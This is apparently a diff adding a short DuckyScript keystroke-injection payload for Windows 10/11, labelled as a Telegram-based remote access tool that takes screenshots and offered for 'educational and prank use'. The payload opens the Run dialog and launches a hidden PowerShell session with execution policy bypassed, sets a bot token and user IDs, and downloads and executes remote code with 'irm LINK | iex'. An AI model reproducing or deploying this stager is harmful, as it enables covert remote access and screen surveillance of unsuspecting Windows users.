@@ -1,0 +1,13 @@
+┌─
+│ hooker01 | github.com/hooker01
+│ Description: Telegram-based remote access tool that takes screenshots and can terminate the script.
+│ Note: Replace YOUR_BOT_TOKEN_HERE and USER_IDS with actual values.
+│ Purpose: Educational and prank use only
+│ Target: Windows 10/11
+└─
+
+ESC
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $APPTK="YOUR_BOT_TOKEN_HERE"; $PU=@(USER_IDS); irm LINK | iex
+ENTER
